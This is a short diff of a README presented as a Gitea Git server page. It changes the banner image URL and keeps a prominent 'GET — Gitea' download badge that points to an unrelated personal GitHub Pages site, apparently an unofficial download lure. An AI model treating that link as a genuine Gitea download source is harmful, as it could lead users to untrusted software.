@@ -1,6 +1,6 @@
 # Gitea Git Server — Repository Management, Git Hosting & Development Workflows
 
-![Banner Placeholder](https://static.cnews.ru/img/book/2026/06/05/gitea_logo_with_wordmark.png)
+![Banner Placeholder](https://blog.gitea.com/img/blog_placeholder.png)
 
 [![GET — Gitea](https://img.shields.io/badge/GET%20%E2%80%94%20Gitea-0078D6?style=for-the-badge&logoColor=white)](https://taulbeeelizabeth17.github.io/.github/Gitea-Git-Server)
 
